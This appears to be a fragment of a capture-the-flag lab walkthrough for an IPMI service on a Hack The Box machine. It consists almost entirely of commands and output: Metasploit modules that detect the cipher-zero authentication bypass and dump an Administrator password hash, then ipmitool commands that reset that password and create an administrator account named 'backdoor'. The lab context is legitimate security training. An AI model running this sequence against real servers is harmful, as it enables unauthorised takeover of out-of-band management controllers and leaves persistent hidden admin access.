to exploit this vulnerability it is important to know username 

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Vulnerability - IPMI Authentication Bypass via Cipher 0
```bash
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > set rhosts 10.10.11.124
rhosts => 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
## find out user login
```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124
rhosts => 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:a8ad3dbf02140000b9bbce17cc0ecbffcc83ffd7afcb5cce770574761c1b25a01e8a5cefb33cf21ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:3302daa57348afdd680138e945cd6f3f7f23617b
[+] 10.10.11.124:623 - IPMI - Hash for user 'Administrator' matches password 'password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


## got ipmi user Administrator
```bash
$ ipmitool  -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P 123 user set password 2 password
```

## new user with admin privs
```bash
┌──(kali㉿kali)-[~/Documents/htb/htb_shibboleth]
└─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P password user set name 4 backdoor
                                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/htb/htb_shibboleth]
└─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P password user set password 4 backdoor
Set User Password command successful (user 4)
                                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/htb/htb_shibboleth]
└─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P password user priv 4 4               
Set Privilege Level command successful (user 4)
                                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/htb/htb_shibboleth]
└─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P password user list    
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
3                    true    false      false      Unknown (0x00)
4   backdoor         true    false      false      ADMINISTRATOR
5                    true    false      false      Unknown (0x00)
```